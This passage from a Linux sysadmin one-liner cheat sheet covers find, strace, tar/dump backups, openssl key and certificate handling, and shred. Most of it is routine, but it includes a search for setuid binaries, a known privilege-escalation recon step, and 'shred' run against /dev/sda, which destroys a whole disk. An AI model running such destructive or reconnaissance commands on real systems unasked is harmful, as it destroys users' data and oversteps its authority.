</code></pre><h6><a class=header href=#recursively-find-the-latest-modified-files id=recursively-find-the-latest-modified-files>Recursively find the latest modified files</a></h6><pre><code class=language-bash>find . -type f -exec stat --format '%Y :%y %n' &quot;{}&quot; \; | sort -nr | cut -d: -f2- | head
</code></pre><h6><a class=header href=#recursively-findreplace-of-a-string-with-sed id=recursively-findreplace-of-a-string-with-sed>Recursively find/replace of a string with sed</a></h6><pre><code class=language-bash>find . -not -path '*/\.git*' -type f -print0 | xargs -0 sed -i 's/foo/bar/g'
</code></pre><h6><a class=header href=#recursively-findreplace-of-a-string-in-directories-and-file-names id=recursively-findreplace-of-a-string-in-directories-and-file-names>Recursively find/replace of a string in directories and file names</a></h6><pre><code class=language-bash>find . -depth -name '*test*' -execdir bash -c 'mv -v &quot;$1&quot; &quot;${1//foo/bar}&quot;' _ {} \;
</code></pre><h6><a class=header href=#recursively-find-suid-executables id=recursively-find-suid-executables>Recursively find suid executables</a></h6><pre><code class=language-bash>find / \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \;
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikitop_softwaretopa id=tool-a-hrefhttpsenwikipediaorgwikitop_softwaretopa>Tool: <a href=https://en.wikipedia.org/wiki/Top_(software)>top</a></a></h5><h6><a class=header href=#use-top-to-monitor-only-all-processes-with-the-specific-string id=use-top-to-monitor-only-all-processes-with-the-specific-string>Use top to monitor only all processes with the specific string</a></h6><pre><code class=language-bash>top -p $(pgrep -d , &lt;str&gt;)
</code></pre><ul><li><code>&lt;str></code> - process containing string (eg. nginx, worker)</ul><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikivmstatvmstata id=tool-a-hrefhttpsenwikipediaorgwikivmstatvmstata>Tool: <a href=https://en.wikipedia.org/wiki/Vmstat>vmstat</a></a></h5><h6><a class=header href=#show-current-system-utilization-fields-in-kilobytes id=show-current-system-utilization-fields-in-kilobytes>Show current system utilization (fields in kilobytes)</a></h6><pre><code class=language-bash>vmstat 2 20 -t -w
</code></pre><ul><li><code>2</code> - number of times with a defined time interval (delay)<li><code>20</code> - each execution of the command (count)<li><code>-t</code> - show timestamp<li><code>-w</code> - wide output<li><code>-S M</code> - output of the fields in megabytes instead of kilobytes</ul><h6><a class=header href=#show-current-system-utilization-will-get-refreshed-every-5-seconds id=show-current-system-utilization-will-get-refreshed-every-5-seconds>Show current system utilization will get refreshed every 5 seconds</a></h6><pre><code class=language-bash>vmstat 5 -w
</code></pre><h6><a class=header href=#display-report-a-summary-of-disk-operations id=display-report-a-summary-of-disk-operations>Display report a summary of disk operations</a></h6><pre><code class=language-bash>vmstat -D
</code></pre><h6><a class=header href=#display-report-of-event-counters-and-memory-stats id=display-report-of-event-counters-and-memory-stats>Display report of event counters and memory stats</a></h6><pre><code class=language-bash>vmstat -s
</code></pre><h6><a class=header href=#display-report-about-kernel-objects-stored-in-slab-layer-cache id=display-report-about-kernel-objects-stored-in-slab-layer-cache>Display report about kernel objects stored in slab layer cache</a></h6><pre><code class=language-bash>vmstat -m
</code></pre><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikiiostatiostata id=tool-a-hrefhttpsenwikipediaorgwikiiostatiostata>Tool: <a href=https://en.wikipedia.org/wiki/Iostat>iostat</a></a></h5><h6><a class=header href=#show-information-about-the-cpu-usage-and-io-statistics-about-all-the-partitions id=show-information-about-the-cpu-usage-and-io-statistics-about-all-the-partitions>Show information about the CPU usage, and I/O statistics about all the partitions</a></h6><pre><code class=language-bash>iostat 2 10 -t -m
</code></pre><ul><li><code>2</code> - number of times with a defined time interval (delay)<li><code>10</code> - each execution of the command (count)<li><code>-t</code> - show timestamp<li><code>-m</code> - fields in megabytes (<code>-k</code> - in kilobytes, default)</ul><h6><a class=header href=#show-information-only-about-the-cpu-utilization id=show-information-only-about-the-cpu-utilization>Show information only about the CPU utilization</a></h6><pre><code class=language-bash>iostat 2 10 -t -m -c
</code></pre><h6><a class=header href=#show-information-only-about-the-disk-utilization id=show-information-only-about-the-disk-utilization>Show information only about the disk utilization</a></h6><pre><code class=language-bash>iostat 2 10 -t -m -d
</code></pre><h6><a class=header href=#show-information-only-about-the-lvm-utilization id=show-information-only-about-the-lvm-utilization>Show information only about the LVM utilization</a></h6><pre><code class=language-bash>iostat -N
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikistracestracea id=tool-a-hrefhttpsenwikipediaorgwikistracestracea>Tool: <a href=https://en.wikipedia.org/wiki/Strace>strace</a></a></h5><h6><a class=header href=#track-with-child-processes id=track-with-child-processes>Track with child processes</a></h6><pre><code class=language-bash># 1)
strace -f -p $(pidof glusterfsd)

# 2)
strace -f $(pidof php-fpm | sed 's/\([0-9]*\)/\-p \1/g')
</code></pre><h6><a class=header href=#track-process-with-30-seconds-limit id=track-process-with-30-seconds-limit>Track process with 30 seconds limit</a></h6><pre><code class=language-bash>timeout 30 strace $(&lt; /var/run/zabbix/zabbix_agentd.pid)
</code></pre><h6><a class=header href=#track-processes-and-redirect-output-to-a-file id=track-processes-and-redirect-output-to-a-file>Track processes and redirect output to a file</a></h6><pre><code class=language-bash>ps auxw | grep '[a]pache' | awk '{print &quot; -p &quot; $2}' | \
xargs strace -o /tmp/strace-apache-proc.out
</code></pre><h6><a class=header href=#track-with-print-time-spent-in-each-syscall-and-limit-length-of-print-strings id=track-with-print-time-spent-in-each-syscall-and-limit-length-of-print-strings>Track with print time spent in each syscall and limit length of print strings</a></h6><pre><code class=language-bash>ps auxw | grep '[i]init_policy' | awk '{print &quot; -p &quot; $2}' | \
xargs strace -f -e trace=network -T -s 10000
</code></pre><h6><a class=header href=#track-the-open-request-of-a-network-port id=track-the-open-request-of-a-network-port>Track the open request of a network port</a></h6><pre><code class=language-bash>strace -f -e trace=bind nc -l 80
</code></pre><h6><a class=header href=#track-the-open-request-of-a-network-port-show-tcpudp id=track-the-open-request-of-a-network-port-show-tcpudp>Track the open request of a network port (show TCP/UDP)</a></h6><pre><code class=language-bash>strace -f -e trace=network nc -lu 80
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikikill_commandkilla id=tool-a-hrefhttpsenwikipediaorgwikikill_commandkilla>Tool: <a href=https://en.wikipedia.org/wiki/Kill_(command)>kill</a></a></h5><h6><a class=header href=#kill-a-process-running-on-port id=kill-a-process-running-on-port>Kill a process running on port</a></h6><pre><code class=language-bash>kill -9 $(lsof -i :&lt;port&gt; | awk '{l=$2} END {print l}')
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikidiffdiffa id=tool-a-hrefhttpsenwikipediaorgwikidiffdiffa>Tool: <a href=https://en.wikipedia.org/wiki/Diff>diff</a></a></h5><h6><a class=header href=#compare-two-directory-trees id=compare-two-directory-trees>Compare two directory trees</a></h6><pre><code class=language-bash>diff &lt;(cd directory1 &amp;&amp; find | sort) &lt;(cd directory2 &amp;&amp; find | sort)
</code></pre><h6><a class=header href=#compare-output-of-two-commands id=compare-output-of-two-commands>Compare output of two commands</a></h6><pre><code class=language-bash>diff &lt;(cat /etc/passwd) &lt;(cut -f2 /etc/passwd)
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpvimdocsourceforgenethtmldocdiffhtmlvimdiffa id=tool-a-hrefhttpvimdocsourceforgenethtmldocdiffhtmlvimdiffa>Tool: <a href=http://vimdoc.sourceforge.net/htmldoc/diff.html>vimdiff</a></a></h5><h6><a class=header href=#highlight-the-exact-differences-based-on-characters-and-words id=highlight-the-exact-differences-based-on-characters-and-words>Highlight the exact differences, based on characters and words</a></h6><pre><code class=language-bash>vimdiff file1 file2
</code></pre><h6><a class=header href=#compare-two-json-files id=compare-two-json-files>Compare two JSON files</a></h6><pre><code class=language-bash>vimdiff &lt;(jq -S . A.json) &lt;(jq -S . B.json)
</code></pre><h6><a class=header href=#compare-hex-dump id=compare-hex-dump>Compare Hex dump</a></h6><pre><code class=language-bash>d(){ vimdiff &lt;(f $1) &lt;(f $2);};f(){ hexdump -C $1|cut -d' ' -f3-|tr -s ' ';}; d ~/bin1 ~/bin2
</code></pre><h6><a class=header href=#diffchar id=diffchar>diffchar</a></h6><p>Save <a href=https://raw.githubusercontent.com/vim-scripts/diffchar.vim/master/plugin/diffchar.vim>diffchar</a> @ <code>~/.vim/plugins</code><p>Click <code>F7</code> to switch between diff modes<p>Usefull <code>vimdiff</code> commands:<ul><li><code>qa</code> to exit all windows<li><code>:vertical resize 70</code> to resize window<li>set window width <code>Ctrl+W [N columns]+(Shift+)&lt;\></code></ul><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikitail_unixtaila id=tool-a-hrefhttpsenwikipediaorgwikitail_unixtaila>Tool: <a href=https://en.wikipedia.org/wiki/Tail_(Unix)>tail</a></a></h5><h6><a class=header href=#annotate-tail--f-with-timestamps id=annotate-tail--f-with-timestamps>Annotate tail -f with timestamps</a></h6><pre><code class=language-bash>tail -f file | while read ; do echo &quot;$(date +%T.%N) $REPLY&quot; ; done
</code></pre><h6><a class=header href=#analyse-an-apache-access-log-for-the-most-common-ip-addresses id=analyse-an-apache-access-log-for-the-most-common-ip-addresses>Analyse an Apache access log for the most common IP addresses</a></h6><pre><code class=language-bash>tail -10000 access_log | awk '{print $1}' | sort | uniq -c | sort -n | tail
</code></pre><h6><a class=header href=#analyse-web-server-log-and-show-only-5xx-http-codes id=analyse-web-server-log-and-show-only-5xx-http-codes>Analyse web server log and show only 5xx http codes</a></h6><pre><code class=language-bash>tail -n 100 -f /path/to/logfile | grep &quot;HTTP/[1-2].[0-1]\&quot; [5]&quot;
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikitar_computingtara id=tool-a-hrefhttpsenwikipediaorgwikitar_computingtara>Tool: <a href=https://en.wikipedia.org/wiki/Tar_(computing)>tar</a></a></h5><h6><a class=header href=#system-backup-with-exclude-specific-directories id=system-backup-with-exclude-specific-directories>System backup with exclude specific directories</a></h6><pre><code class=language-bash>cd /
tar -czvpf /mnt/system$(date +%d%m%Y%s).tgz --directory=/ \
--exclude=proc/* --exclude=sys/* --exclude=dev/* --exclude=mnt/* .
</code></pre><h6><a class=header href=#system-backup-with-exclude-specific-directories-pigz id=system-backup-with-exclude-specific-directories-pigz>System backup with exclude specific directories (pigz)</a></h6><pre><code class=language-bash>cd /
tar cvpf /backup/snapshot-$(date +%d%m%Y%s).tgz --directory=/ \
--exclude=proc/* --exclude=sys/* --exclude=dev/* \
--exclude=mnt/* --exclude=tmp/* --use-compress-program=pigz .
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikidump_programdumpa id=tool-a-hrefhttpsenwikipediaorgwikidump_programdumpa>Tool: <a href=https://en.wikipedia.org/wiki/Dump_(program)>dump</a></a></h5><h6><a class=header href=#system-backup-to-file id=system-backup-to-file>System backup to file</a></h6><pre><code class=language-bash>dump -y -u -f /backup/system$(date +%d%m%Y%s).lzo /
</code></pre><h6><a class=header href=#restore-system-from-lzo-file id=restore-system-from-lzo-file>Restore system from lzo file</a></h6><pre><code class=language-bash>cd /
restore -rf /backup/system$(date +%d%m%Y%s).lzo
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpcpulimitsourceforgenetcpulimita id=tool-a-hrefhttpcpulimitsourceforgenetcpulimita>Tool: <a href=http://cpulimit.sourceforge.net/>cpulimit</a></a></h5><h6><a class=header href=#limit-the-cpu-usage-of-a-process id=limit-the-cpu-usage-of-a-process>Limit the cpu usage of a process</a></h6><pre><code class=language-bash>cpulimit -p pid -l 50
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpswwwcybercitibizfaqunix-linux-pwdx-command-examples-usage-syntaxpwdxa id=tool-a-hrefhttpswwwcybercitibizfaqunix-linux-pwdx-command-examples-usage-syntaxpwdxa>Tool: <a href=https://www.cyberciti.biz/faq/unix-linux-pwdx-command-examples-usage-syntax/>pwdx</a></a></h5><h6><a class=header href=#show-current-working-directory-of-a-process-1 id=show-current-working-directory-of-a-process-1>Show current working directory of a process</a></h6><pre><code class=language-bash>pwdx &lt;pid&gt;
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpswwwcybercitibizfaqtaskset-cpu-affinity-commandtaskseta id=tool-a-hrefhttpswwwcybercitibizfaqtaskset-cpu-affinity-commandtaskseta>Tool: <a href=https://www.cyberciti.biz/faq/taskset-cpu-affinity-command/>taskset</a></a></h5><h6><a class=header href=#start-a-command-on-only-one-cpu-core id=start-a-command-on-only-one-cpu-core>Start a command on only one CPU core</a></h6><pre><code class=language-bash>taskset -c 0 &lt;command&gt;
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikitr_unixtra id=tool-a-hrefhttpsenwikipediaorgwikitr_unixtra>Tool: <a href=https://en.wikipedia.org/wiki/Tr_(Unix)>tr</a></a></h5><h6><a class=header href=#show-directories-in-the-path-one-per-line id=show-directories-in-the-path-one-per-line>Show directories in the PATH, one per line</a></h6><pre><code class=language-bash>tr : '\n' &lt;&lt;&lt;$PATH
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikichmodchmoda id=tool-a-hrefhttpsenwikipediaorgwikichmodchmoda>Tool: <a href=https://en.wikipedia.org/wiki/Chmod>chmod</a></a></h5><h6><a class=header href=#remove-executable-bit-from-all-files-in-the-current-directory id=remove-executable-bit-from-all-files-in-the-current-directory>Remove executable bit from all files in the current directory</a></h6><pre><code class=language-bash>chmod -R -x+X *
</code></pre><h6><a class=header href=#restore-permission-for-binchmod id=restore-permission-for-binchmod>Restore permission for /bin/chmod</a></h6><pre><code class=language-bash># 1:
cp /bin/ls chmod.01
cp /bin/chmod chmod.01
./chmod.01 700 file

# 2:
/bin/busybox chmod 0700 /bin/chmod

# 3:
setfacl --set urwx,g---,o--- /bin/chmod
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikiwho_unixwhoa id=tool-a-hrefhttpsenwikipediaorgwikiwho_unixwhoa>Tool: <a href=https://en.wikipedia.org/wiki/Who_(Unix)>who</a></a></h5><h6><a class=header href=#find-last-reboot-time id=find-last-reboot-time>Find last reboot time</a></h6><pre><code class=language-bash>who -b
</code></pre><h6><a class=header href=#detect-a-user-sudo-sud-into-the-current-shell id=detect-a-user-sudo-sud-into-the-current-shell>Detect a user sudo-su'd into the current shell</a></h6><pre><code class=language-bash>[[ $(who -m | awk '{ print $1 }') == $(whoami) ]] || echo &quot;You are su-ed to $(whoami)&quot;
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpswwwhowtoforgecomlinux-last-commandlasta id=tool-a-hrefhttpswwwhowtoforgecomlinux-last-commandlasta>Tool: <a href=https://www.howtoforge.com/linux-last-command/>last</a></a></h5><h6><a class=header href=#was-the-last-reboot-a-panic id=was-the-last-reboot-a-panic>Was the last reboot a panic?</a></h6><pre><code class=language-bash>(last -x -f $(ls -1t /var/log/wtmp* | head -2 | tail -1); last -x -f /var/log/wtmp) | \
grep -A1 reboot | head -2 | grep -q shutdown &amp;&amp; echo &quot;Expected reboot&quot; || echo &quot;Panic reboot&quot;
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikignu_screenscreena id=tool-a-hrefhttpsenwikipediaorgwikignu_screenscreena>Tool: <a href=https://en.wikipedia.org/wiki/GNU_Screen>screen</a></a></h5><h6><a class=header href=#start-screen-in-detached-mode id=start-screen-in-detached-mode>Start screen in detached mode</a></h6><pre><code class=language-bash>screen -d -m &lt;command&gt;
</code></pre><h6><a class=header href=#attach-to-an-existing-screen-session id=attach-to-an-existing-screen-session>Attach to an existing screen session</a></h6><pre><code class=language-bash>screen -r -d &lt;pid&gt;
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikiscript_unixscripta id=tool-a-hrefhttpsenwikipediaorgwikiscript_unixscripta>Tool: <a href=https://en.wikipedia.org/wiki/Script_(Unix)>script</a></a></h5><h6><a class=header href=#record-and-replay-terminal-session id=record-and-replay-terminal-session>Record and replay terminal session</a></h6><pre><code class=language-bash>### Record session
# 1)
script -t 2&gt;~/session.time -a ~/session.log

# 2)
script --timing=session.time session.log

### Replay session
scriptreplay --timing=session.time session.log
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikignu_screendua id=tool-a-hrefhttpsenwikipediaorgwikignu_screendua>Tool: <a href=https://en.wikipedia.org/wiki/GNU_Screen>du</a></a></h5><h6><a class=header href=#show-20-biggest-directories-with-k-m-g id=show-20-biggest-directories-with-k-m-g>Show 20 biggest directories with 'K M G'</a></h6><pre><code class=language-bash>du | \
sort -r -n | \
awk '{split(&quot;K M G&quot;,v); s=1; while($1&gt;1024){$1/=1024; s++} print int($1)&quot; &quot;v[s]&quot;\t&quot;$2}' | \
head -n 20
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikignu_screeninotifywaita id=tool-a-hrefhttpsenwikipediaorgwikignu_screeninotifywaita>Tool: <a href=https://en.wikipedia.org/wiki/GNU_Screen>inotifywait</a></a></h5><h6><a class=header href=#init-tool-everytime-a-file-in-a-directory-is-modified id=init-tool-everytime-a-file-in-a-directory-is-modified>Init tool everytime a file in a directory is modified</a></h6><pre><code class=language-bash>while true ; do inotifywait -r -e MODIFY dir/ &amp;&amp; ls dir/ ; done;
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpswwwopensslorgopenssla id=tool-a-hrefhttpswwwopensslorgopenssla>Tool: <a href=https://www.openssl.org/>openssl</a></a></h5><h6><a class=header href=#testing-connection-to-the-remote-host id=testing-connection-to-the-remote-host>Testing connection to the remote host</a></h6><pre><code class=language-bash>echo | openssl s_client -connect google.com:443 -showcerts
</code></pre><h6><a class=header href=#testing-connection-to-the-remote-host-with-sni-support id=testing-connection-to-the-remote-host-with-sni-support>Testing connection to the remote host (with SNI support)</a></h6><pre><code class=language-bash>echo | openssl s_client -showcerts -servername google.com -connect google.com:443
</code></pre><h6><a class=header href=#testing-connection-to-the-remote-host-with-specific-ssl-version id=testing-connection-to-the-remote-host-with-specific-ssl-version>Testing connection to the remote host with specific ssl version</a></h6><pre><code class=language-bash>openssl s_client -tls1_2 -connect google.com:443
</code></pre><h6><a class=header href=#testing-connection-to-the-remote-host-with-specific-ssl-cipher id=testing-connection-to-the-remote-host-with-specific-ssl-cipher>Testing connection to the remote host with specific ssl cipher</a></h6><pre><code class=language-bash>openssl s_client -cipher 'AES128-SHA' -connect google.com:443
</code></pre><h6><a class=header href=#verify-0-rtt id=verify-0-rtt>Verify 0-RTT</a></h6><pre><code class=language-bash>_host=&quot;example.com&quot;

cat &gt; req.in &lt;&lt; __EOF__
HEAD / HTTP/1.1
Host: $_host
Connection: close
__EOF__

openssl s_client -connect ${_host}:443 -tls1_3 -sess_out session.pem -ign_eof &lt; req.in
openssl s_client -connect ${_host}:443 -tls1_3 -sess_in session.pem -early_data req.in
</code></pre><h6><a class=header href=#generate-private-key-without-passphrase id=generate-private-key-without-passphrase>Generate private key without passphrase</a></h6><pre><code class=language-bash># _len: 2048, 4096
( _fd=&quot;private.key&quot; ; _len=&quot;4096&quot; ; \
openssl genrsa -out ${_fd} ${_len} )
</code></pre><h6><a class=header href=#generate-private-key-with-passphrase id=generate-private-key-with-passphrase>Generate private key with passphrase</a></h6><pre><code class=language-bash># _ciph: des3, aes128, aes256
# _len: 2048, 4096
( _ciph=&quot;aes128&quot; ; _fd=&quot;private.key&quot; ; _len=&quot;4096&quot; ; \
openssl genrsa -${_ciph} -out ${_fd} ${_len} )
</code></pre><h6><a class=header href=#remove-passphrase-from-private-key id=remove-passphrase-from-private-key>Remove passphrase from private key</a></h6><pre><code class=language-bash>( _fd=&quot;private.key&quot; ; _fd_unp=&quot;private_unp.key&quot; ; \
openssl rsa -in ${_fd} -out ${_fd_unp} )
</code></pre><h6><a class=header href=#encrypt-existing-private-key-with-a-passphrase id=encrypt-existing-private-key-with-a-passphrase>Encrypt existing private key with a passphrase</a></h6><pre><code class=language-bash># _ciph: des3, aes128, aes256
( _ciph=&quot;aes128&quot; ; _fd=&quot;private.key&quot; ; _fd_pass=&quot;private_pass.key&quot; ; \
openssl rsa -${_ciph} -in ${_fd} -out ${_fd_pass}
</code></pre><h6><a class=header href=#check-private-key id=check-private-key>Check private key</a></h6><pre><code class=language-bash>( _fd=&quot;private.key&quot; ; \
openssl rsa -check -in ${_fd} )
</code></pre><h6><a class=header href=#get-public-key-from-private-key id=get-public-key-from-private-key>Get public key from private key</a></h6><pre><code class=language-bash>( _fd=&quot;private.key&quot; ; _fd_pub=&quot;public.key&quot; ; \
openssl rsa -pubout -in ${_fd} -out ${_fd_pub} )
</code></pre><h6><a class=header href=#generate-private-key-and-csr id=generate-private-key-and-csr>Generate private key and CSR</a></h6><pre><code class=language-bash>( _fd=&quot;private.key&quot; ; _fd_csr=&quot;request.csr&quot; ; _len=&quot;4096&quot; ; \
openssl req -out ${_fd_csr} -new -newkey rsa:${_len} -nodes -keyout ${_fd} )
</code></pre><h6><a class=header href=#generate-csr id=generate-csr>Generate CSR</a></h6><pre><code class=language-bash>( _fd=&quot;private.key&quot; ; _fd_csr=&quot;request.csr&quot; ; \
openssl req -out ${_fd_csr} -new -key ${_fd} )
</code></pre><h6><a class=header href=#generate-csr-metadata-from-existing-certificate id=generate-csr-metadata-from-existing-certificate>Generate CSR (metadata from existing certificate)</a></h6><pre><code class=language-bash>( _fd=&quot;private.key&quot; ; _fd_csr=&quot;request.csr&quot; ; _fd_crt=&quot;cert.crt&quot; ; \
openssl x509 -x509toreq -in ${_fd_crt} -out ${_fd_csr} -signkey ${_fd} )
</code></pre><h6><a class=header href=#generate-csr-with--config-param id=generate-csr-with--config-param>Generate CSR with -config param</a></h6><pre><code class=language-bash>( _fd=&quot;private.key&quot; ; _fd_csr=&quot;request.csr&quot; ; \
openssl req -new -sha256 -key ${_fd} -out ${_fd_csr} \
-config &lt;(
cat &lt;&lt;-EOF
[req]
default_bits        = 2048
default_md          = sha256
prompt              = no
distinguished_name  = dn
req_extensions      = req_ext

[ dn ]
C   = &quot;&lt;two-letter ISO abbreviation for your country&gt;&quot;
ST  = &quot;&lt;state or province where your organisation is legally located&gt;&quot;
L   = &quot;&lt;city where your organisation is legally located&gt;&quot;
O   = &quot;&lt;legal name of your organisation&gt;&quot;
OU  = &quot;&lt;section of the organisation&gt;&quot;
CN  = &quot;&lt;fully qualified domain name&gt;&quot;

[ req_ext ]
subjectAltName = @alt_names

[ alt_names ]
DNS.1 = &lt;fully qualified domain name&gt;
DNS.2 = &lt;next domain&gt;
DNS.3 = &lt;next domain&gt;
EOF
))
</code></pre><p>Other values in <code>[ dn ]</code>:<blockquote><p>Look at this great explanation: <a href=https://apfelboymchen.net/gnu/notes/openssl%20multidomain%20with%20config%20files.html>How to create multidomain certificates using config files</a></blockquote><pre><code>countryName            = &quot;DE&quot;                     # C=
stateOrProvinceName    = &quot;Hessen&quot;                 # ST=
localityName           = &quot;Keller&quot;                 # L=
postalCode             = &quot;424242&quot;                 # L/postalcode=
streetAddress          = &quot;Crater 1621&quot;            # L/street=
organizationName       = &quot;apfelboymschule&quot;        # O=
organizationalUnitName = &quot;IT Department&quot;          # OU=
commonName             = &quot;example.com&quot;            # CN=
emailAddress           = &quot;webmaster@example.com&quot;  # CN/emailAddress=
</code></pre><h6><a class=header href=#list-available-ec-curves id=list-available-ec-curves>List available EC curves</a></h6><pre><code class=language-bash>openssl ecparam -list_curves
</code></pre><h6><a class=header href=#generate-ecdsa-private-key id=generate-ecdsa-private-key>Generate ECDSA private key</a></h6><pre><code class=language-bash># _curve: prime256v1, secp521r1, secp384r1
( _fd=&quot;private.key&quot; ; _curve=&quot;prime256v1&quot; ; \
openssl ecparam -out ${_fd} -name ${_curve} -genkey )

# _curve: X25519
( _fd=&quot;private.key&quot; ; _curve=&quot;x25519&quot; ; \
openssl genpkey -algorithm ${_curve} -out ${_fd} )
</code></pre><h6><a class=header href=#print-ecdsa-private-and-public-keys id=print-ecdsa-private-and-public-keys>Print ECDSA private and public keys</a></h6><pre><code class=language-bash>( _fd=&quot;private.key&quot; ; \
openssl ec -in ${_fd} -noout -text )

# For x25519 only extracting public key
( _fd=&quot;private.key&quot; ; _fd_pub=&quot;public.key&quot; ; \
openssl pkey -in ${_fd} -pubout -out ${_fd_pub} )
</code></pre><h6><a class=header href=#generate-private-key-with-csr-ecc id=generate-private-key-with-csr-ecc>Generate private key with CSR (ECC)</a></h6><pre><code class=language-bash># _curve: prime256v1, secp521r1, secp384r1
( _fd=&quot;domain.com.key&quot; ; _fd_csr=&quot;domain.com.csr&quot; ; _curve=&quot;prime256v1&quot; ; \
openssl ecparam -out ${_fd} -name ${_curve} -genkey ; \
openssl req -new -key ${_fd} -out ${_fd_csr} -sha256 )
</code></pre><h6><a class=header href=#generate-self-signed-certificate id=generate-self-signed-certificate>Generate self-signed certificate</a></h6><pre><code class=language-bash># _len: 2048, 4096
( _fd=&quot;domain.key&quot; ; _fd_out=&quot;domain.crt&quot; ; _len=&quot;4096&quot; ; _days=&quot;365&quot; ; \
openssl req -newkey rsa:${_len} -nodes \
-keyout ${_fd} -x509 -days ${_days} -out ${_fd_out} )
</code></pre><h6><a class=header href=#generate-self-signed-certificate-from-existing-private-key id=generate-self-signed-certificate-from-existing-private-key>Generate self-signed certificate from existing private key</a></h6><pre><code class=language-bash># _len: 2048, 4096
( _fd=&quot;domain.key&quot; ; _fd_out=&quot;domain.crt&quot; ; _days=&quot;365&quot; ; \
openssl req -key ${_fd} -nodes \
-x509 -days ${_days} -out ${_fd_out} )
</code></pre><h6><a class=header href=#generate-self-signed-certificate-from-existing-private-key-and-csr id=generate-self-signed-certificate-from-existing-private-key-and-csr>Generate self-signed certificate from existing private key and csr</a></h6><pre><code class=language-bash># _len: 2048, 4096
( _fd=&quot;domain.key&quot; ; _fd_csr=&quot;domain.csr&quot; ; _fd_out=&quot;domain.crt&quot; ; _days=&quot;365&quot; ; \
openssl x509 -signkey ${_fd} -nodes \
-in ${_fd_csr} -req -days ${_days} -out ${_fd_out} )
</code></pre><h6><a class=header href=#generate-dh-public-parameters id=generate-dh-public-parameters>Generate DH public parameters</a></h6><pre><code class=language-bash>( _dh_size=&quot;2048&quot; ; \
openssl dhparam -out /etc/nginx/ssl/dhparam_${_dh_size}.pem &quot;$_dh_size&quot; )
</code></pre><h6><a class=header href=#display-dh-public-parameters id=display-dh-public-parameters>Display DH public parameters</a></h6><pre><code class=language-bash>openssl pkeyparam -in dhparam.pem -text
</code></pre><h6><a class=header href=#extract-private-key-from-pfx id=extract-private-key-from-pfx>Extract private key from pfx</a></h6><pre><code class=language-bash>( _fd_pfx=&quot;cert.pfx&quot; ; _fd_key=&quot;key.pem&quot; ; \
openssl pkcs12 -in ${_fd_pfx} -nocerts -nodes -out ${_fd_key} )
</code></pre><h6><a class=header href=#extract-private-key-and-certs-from-pfx id=extract-private-key-and-certs-from-pfx>Extract private key and certs from pfx</a></h6><pre><code class=language-bash>( _fd_pfx=&quot;cert.pfx&quot; ; _fd_pem=&quot;key_certs.pem&quot; ; \
openssl pkcs12 -in ${_fd_pfx} -nodes -out ${_fd_pem} )
</code></pre><h6><a class=header href=#convert-der-to-pem id=convert-der-to-pem>Convert DER to PEM</a></h6><pre><code class=language-bash>( _fd_der=&quot;cert.crt&quot; ; _fd_pem=&quot;cert.pem&quot; ; \
openssl x509 -in ${_fd_der} -inform der -outform pem -out ${_fd_pem} )
</code></pre><h6><a class=header href=#convert-pem-to-der id=convert-pem-to-der>Convert PEM to DER</a></h6><pre><code class=language-bash>( _fd_der=&quot;cert.crt&quot; ; _fd_pem=&quot;cert.pem&quot; ; \
openssl x509 -in ${_fd_pem} -outform der -out ${_fd_der} )
</code></pre><h6><a class=header href=#verification-of-the-private-key id=verification-of-the-private-key>Verification of the private key</a></h6><pre><code class=language-bash>( _fd=&quot;private.key&quot; ; \
openssl rsa -noout -text -in ${_fd} )
</code></pre><h6><a class=header href=#verification-of-the-public-key id=verification-of-the-public-key>Verification of the public key</a></h6><pre><code class=language-bash># 1)
( _fd=&quot;public.key&quot; ; \
openssl pkey -noout -text -pubin -in ${_fd} )

# 2)
( _fd=&quot;private.key&quot; ; \
openssl rsa -inform PEM -noout -in ${_fd} &amp;&gt; /dev/null ; \
if [ $? = 0 ] ; then echo -en &quot;OK\n&quot; ; fi )
</code></pre><h6><a class=header href=#verification-of-the-certificate id=verification-of-the-certificate>Verification of the certificate</a></h6><pre><code class=language-bash>( _fd=&quot;certificate.crt&quot; ; # format: pem, cer, crt \
openssl x509 -noout -text -in ${_fd} )
</code></pre><h6><a class=header href=#verification-of-the-csr id=verification-of-the-csr>Verification of the CSR</a></h6><pre><code class=language-bash>( _fd_csr=&quot;request.csr&quot; ; \
openssl req -text -noout -in ${_fd_csr} )
</code></pre><h6><a class=header href=#check-whether-the-private-key-and-the-certificate-match id=check-whether-the-private-key-and-the-certificate-match>Check whether the private key and the certificate match</a></h6><pre><code class=language-bash>(openssl rsa -noout -modulus -in private.key | openssl md5 ; \
openssl x509 -noout -modulus -in certificate.crt | openssl md5) | uniq
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpswikiarchlinuxorgindexphpsecurely_wipe_disksecure-deletea id=tool-a-hrefhttpswikiarchlinuxorgindexphpsecurely_wipe_disksecure-deletea>Tool: <a href=https://wiki.archlinux.org/index.php/Securely_wipe_disk>secure-delete</a></a></h5><h6><a class=header href=#secure-delete-with-shred id=secure-delete-with-shred>Secure delete with shred</a></h6><pre><code class=language-bash>shred -vfuz -n 10 file
shred --verbose --random-source=/dev/urandom -n 1 /dev/sda
